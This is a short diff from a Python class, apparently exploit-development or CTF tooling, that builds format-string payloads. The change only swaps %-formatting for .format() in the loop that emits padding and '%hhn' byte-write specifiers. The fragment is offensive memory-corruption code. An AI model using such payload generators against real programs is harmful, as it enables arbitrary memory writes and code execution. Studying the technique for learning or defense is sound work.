@@ -25,8 +25,8 @@ class FormatStringExploit:
             byte = i[1]
             pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
             if pad > 0:
-                payload += "%%%dc" % (pad)
-            payload += "%%%d$hhn" % (self.offset + idx)
+                payload += "%{}c".format(pad)
+            payload += "%{}$hhn".format(self.offset + idx)
             FormatStringExploit.printed += pad
         return payload
 
